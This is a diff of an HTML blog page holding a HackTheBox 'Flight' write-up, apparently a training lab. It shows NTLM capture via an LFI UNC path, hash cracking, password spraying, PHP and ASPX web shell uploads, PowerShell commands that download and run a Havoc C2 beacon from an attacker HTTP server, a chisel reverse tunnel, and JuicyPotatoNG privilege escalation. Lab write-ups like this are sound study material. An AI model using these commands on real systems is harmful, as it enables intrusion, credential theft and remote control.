@@ -7,8 +7,6 @@
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
       
-        <meta name="author" content="['@kf0k']">
-      
       
       
         <link rel="prev" href="../../bastian/writeup/">
@@ -21,7 +19,7 @@
     
     
       
-        <title>HacktheBox Flight - Blog</title>
+        <title>Overview - Blog</title>
       
     
     
@@ -101,7 +99,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              HacktheBox Flight
+              Overview
             
           </span>
         </div>
@@ -593,12 +591,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          HacktheBox Flight
+          Overview
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        HacktheBox Flight
+        Overview
       </a>
       
         
@@ -990,7 +988,7 @@
 
 
 <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/1.png" /></p>
+<p><img alt="" src="../writeup.assets/1.png" /></p>
 <p>Flight was Domain Controller which have multiple pivoting points between Domain Users/services. The box have interesting and different techniques for exploiting and pivoting between Domain Users/services. Including: Local File Include, using Responder to capture hashes, password spray, enumerating shares, uploading PHP and ASPX web shells, abusing seImpersonate for privileges escalation. </p>
 <h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <table>
@@ -1010,7 +1008,7 @@
 </tbody>
 </table>
 <h1 id="attack-scenario-road-map">Attack Scenario Road Map<a class="headerlink" href="#attack-scenario-road-map" title="Permanent link">&para;</a></h1>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/scripts/flight/flight.png" /></p>
+<p><img alt="" src="../writeup.assets/flight.png" /></p>
 <h1 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h1>
 <h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
 <h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
@@ -1061,7 +1059,7 @@ Found:<span class="w"> </span>school.flight.htb
 <p>Enumerating the subdomains reveal for us a new subdomain: <code>school.flight.htb</code></p>
 <h2 id="web-enumeration-schoolflighthtb">Web Enumeration - school.flight.htb<a class="headerlink" href="#web-enumeration-schoolflighthtb" title="Permanent link">&para;</a></h2>
 <p>Going through the website we will identify a Local File Inclusion vulnerability in the path: <code>http://school.flight.htb/index.php?view=&lt;&gt;</code> however, the website blocks any requests that contains LFI payloads. </p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/scripts/flight/1-lfi/1.png" /></p>
+<p><img alt="" src="../writeup.assets/lfi.png" /></p>
 <h3 id="capturing-ntlm-hash-apache_svc">Capturing NTLM Hash - apache_svc<a class="headerlink" href="#capturing-ntlm-hash-apache_svc" title="Permanent link">&para;</a></h3>
 <p>Rather than trying to read local files, let’s try to put our own network address path and running <code>Responder</code> in the background. </p>
 <div class="highlight"><pre><span></span><code>http://school.flight.htb/index.php?view<span class="o">=</span>//10.10.14.45/abc
@@ -1079,8 +1077,8 @@ Found:<span class="w"> </span>school.flight.htb
 SVC_APACHE::flight:fde05e6
 ...
 ...
-<span class="m">00000</span>:S@Ss!K@*t13
-</code></pre></div>
+<span class="hll"><span class="m">00000</span>:S@Ss!K@*t13
+</span></code></pre></div>
 <p>We cracked <code>svc_apache</code> hash which is: <code>S@Ss!K@*t13</code> to validate it we can use crackmapexec: </p>
 <div class="highlight"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span>flight.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w">                            </span>
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
@@ -1124,8 +1122,8 @@ SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><spa
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\C</span>.BUM:S@Ss!K@*t13<span class="w"> </span>STATUS_LOGON_FAILURE<span class="w"> </span>
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\M</span>.GOLD:S@Ss!K@*t13<span class="w"> </span>STATUS_LOGON_FAILURE<span class="w"> </span>
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\L</span>.KEIN:S@Ss!K@*t13<span class="w"> </span>STATUS_LOGON_FAILURE<span class="w"> </span>
-SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.MOON:S@Ss!K@*t13
-</code></pre></div>
+<span class="hll">SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\S</span>.MOON:S@Ss!K@*t13
+</span></code></pre></div>
 <p>We found that <code>s.moon</code> is using the same password of <code>svc_apache</code> </p>
 <h2 id="enumerating-shared-folders">Enumerating Shared Folders<a class="headerlink" href="#enumerating-shared-folders" title="Permanent link">&para;</a></h2>
 <p>The Domain User <code>s.moon</code> have read and write privileges in the folder <code>shared</code></p>
@@ -1139,8 +1137,8 @@ SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><spa
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
-SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Shared<span class="w">          </span>READ,WRITE<span class="w">      </span>
-SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
+<span class="hll">SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Shared<span class="w">          </span>READ,WRITE<span class="w">      </span>
+</span>SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Users<span class="w">           </span>READ<span class="w">            </span>
 SMB<span class="w">         </span>school.flight.htb<span class="w"> </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Web<span class="w">             </span>READ
 </code></pre></div>
@@ -1158,7 +1156,8 @@ putting<span class="w"> </span>file<span class="w"> </span>abc.ini<span class="w
 </code></pre></div>
 <h2 id="cracking-ntlm-hash-cbum">Cracking NTLM Hash - c.bum<a class="headerlink" href="#cracking-ntlm-hash-cbum" title="Permanent link">&para;</a></h2>
 <p>Again using hashcat we can attempt to crack it with <code>rockyou.txt</code> wordlist.</p>
-<div class="highlight"><pre><span></span><code>C.BUM::flight.htb:8...
+<div class="highlight"><pre><span></span><code>hahcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span>rockyou.txt
+C.BUM::flight.htb:8...
 ..0:Tikkycoll_431012284
 </code></pre></div>
 <p>We obtained <code>c.bum</code> credentials: <code>c.bum:Tikkycoll_431012284</code> </p>
@@ -1184,25 +1183,25 @@ smb:<span class="w"> </span><span class="se">\s</span>chool.flight.htb<span clas
 putting<span class="w"> </span>file<span class="w"> </span>image.php<span class="w"> </span>as<span class="w"> </span><span class="se">\s</span>chool.flight.htb<span class="se">\i</span>mages<span class="se">\i</span>mage.php<span class="w"> </span><span class="o">(</span><span class="m">0</span>.6<span class="w"> </span>kb/s<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">0</span>.6<span class="w"> </span>kb/s<span class="o">)</span>
 </code></pre></div>
 <p>After uploading the web shell, we can now navigate to <code>http://school.flight.htb/images/image</code> and execute commands by passing system commands in  the parameter <code>0</code> .</p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230202234135597.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230202234135597.png" /></p>
 <h2 id="maintain-access-cbum">Maintain Access - c.bum<a class="headerlink" href="#maintain-access-cbum" title="Permanent link">&para;</a></h2>
 <p>To obtain access in the target, we can upload C2 beacon. Here I used Havoc C2. In order to do it, first we upload our beacon in the target either hosting HTTP server or using SMB. I used here the first method:</p>
-<ul>
-<li>In my local machine I hosted HTTP server using Python</li>
-</ul>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Local</label><label for="__tabbed_1_2">Target</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
 <div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9090</span>
 </code></pre></div>
-<ul>
-<li>In the target machine, in the web shell, run the following command </li>
-</ul>
+</div>
+<div class="tabbed-block">
 <div class="highlight"><pre><span></span><code>image.php?0<span class="o">=</span>powershell<span class="w"> </span>-nop<span class="w"> </span>iwr<span class="w"> </span>http://10.10.14.&lt;&gt;:9090/demon.exe<span class="w"> </span>-o<span class="w"> </span><span class="se">\p</span>rogramdata<span class="se">\d</span>emon.exe
 </code></pre></div>
-<ul>
-<li>Then, in the target, run the beacon to recieve callback in our C2 server</li>
-</ul>
+</div>
+</div>
+</div>
+<p>Then, in the target, run the beacon to recieve callback in our C2 server</p>
 <div class="highlight"><pre><span></span><code>image.php?0<span class="o">=</span><span class="se">\p</span>rogramdata<span class="se">\d</span>emon.exe
 </code></pre></div>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203000648255.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203000648255.png" /></p>
 <p>To run commands as <code>c.bum</code> we can use <code>runas_cs</code> tool: https://github.com/antonioCoco/RunasCs</p>
 <p>We will use Havoc to upload <code>runas_cs</code> to the target </p>
 <div class="highlight"><pre><span></span><code>powershell<span class="w"> </span>iwr<span class="w"> </span>http://10.10.14.45:9090/runas_cs.exe<span class="w"> </span>-o<span class="w"> </span><span class="se">\p</span>rogramdata<span class="se">\c</span>s.exe
@@ -1210,34 +1209,34 @@ putting<span class="w"> </span>file<span class="w"> </span>image.php<span class=
 <p>Then run:</p>
 <div class="highlight"><pre><span></span><code>shell<span class="w"> </span>c:<span class="se">\p</span>rogramdata<span class="se">\c</span>s.exe<span class="w"> </span>c.bum<span class="w"> </span>Tikkycoll_431012284<span class="w"> </span>c:<span class="se">\p</span>rogramdata<span class="se">\d</span>emon.exe
 </code></pre></div>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203001445446.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203001445446.png" /></p>
 <h2 id="enumerating-the-target">Enumerating the Target<a class="headerlink" href="#enumerating-the-target" title="Permanent link">&para;</a></h2>
 <p>Viewing the running services will reveal for us that there is a local web application running in port 8000</p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203001803341.png" />  </p>
+<p><img alt="" src="../writeup.assets/image-20230203001803341.png" />  </p>
 <p>Here we will upload <code>chisel</code> to access the local web application</p>
 <div class="highlight"><pre><span></span><code>powershell<span class="w"> </span>iwr<span class="w"> </span>http://10.10.14.45:9090/chisel.exe<span class="w"> </span>-o<span class="w"> </span><span class="se">\p</span>rogramdata<span class="se">\c</span>h.exe
 </code></pre></div>
 <p>In local machine run:</p>
 <div class="highlight"><pre><span></span><code>./chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8443</span><span class="w"> </span>--reverse
 </code></pre></div>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203003805637.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203003805637.png" /></p>
 <p>In the target run: </p>
 <div class="highlight"><pre><span></span><code>shell<span class="w"> </span>c:<span class="se">\p</span>rogramdata<span class="se">\c</span>h.exe<span class="w"> </span>client<span class="w"> </span>&lt;ip&gt;:8443<span class="w"> </span>R:socks
 </code></pre></div>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203003740051.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203003740051.png" /></p>
 <p>Then, we can access the web application using socks5 proxy and proxychains</p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203003939774.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203003939774.png" /></p>
 <p>By enumerating files will notice a writable folder by <code>c.bum</code> which is located at: <code>c:\inetpub\development</code> </p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203002808883.png" /> </p>
+<p><img alt="" src="../writeup.assets/image-20230203002808883.png" /> </p>
 <h3 id="uploading-aspx-web-shell">Uploading ASPX Web Shell<a class="headerlink" href="#uploading-aspx-web-shell" title="Permanent link">&para;</a></h3>
 <p>Let's try to upload a web shell in website:</p>
 <p>From Havoc C2, while running as <code>c.bum</code>, run: </p>
 <div class="highlight"><pre><span></span><code>upload<span class="w"> </span>/tmp/image.aspx<span class="w"> </span>c:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment<span class="se">\i</span>mage.aspx
 </code></pre></div>
 <p>Then, navigate to <code>http://127.0.0.1:8000</code> and execute Havoc C2 Beacon. </p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203004557240.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203004557240.png" /></p>
 <p>Then, we obtained access as <code>DefaultAppPool</code> service account which have <code>SeImpersonate</code> privileges.</p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203005043280.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203005043280.png" /></p>
 <h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
 <p>Because the service account <code>DefaultAppPool</code> have <code>SeImpersonate</code> privileges we can impersonate any user including the Local Admin. We can abuse this using  <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a></p>
 <p>To escalate privileges into system, first upload JuicyPotato in the target: </p>
@@ -1247,7 +1246,7 @@ putting<span class="w"> </span>file<span class="w"> </span>image.php<span class=
 <div class="highlight"><pre><span></span><code>shell<span class="w"> </span><span class="se">\p</span>rogramdata<span class="se">\j</span>p.exe<span class="w"> </span>-t<span class="w"> </span>*<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;cmd.exe&quot;</span><span class="w"> </span>-a<span class="w"> </span><span class="s2">&quot;/c c:\programdata\demon.exe&quot;</span>
 </code></pre></div>
 <p>Then, we will be able to obtain access as system with full privileges.</p>
-<p><img alt="" src="/home/kali/Desktop/HTB/Boxes/flight/notes/writeup.assets/image-20230203010046389.png" /></p>
+<p><img alt="" src="../writeup.assets/image-20230203010046389.png" /></p>
 
 
 
@@ -1258,6 +1257,8 @@ putting<span class="w"> </span>file<span class="w"> </span>image.php<span class=
             </div>
           
           
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
         </div>
         
       </main>
@@ -1315,7 +1316,7 @@ putting<span class="w"> </span>file<span class="w"> </span>image.php<span class=
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs"], "search": "../../../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "content.tabs.link"], "search": "../../../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.6df46069.min.js"></script>
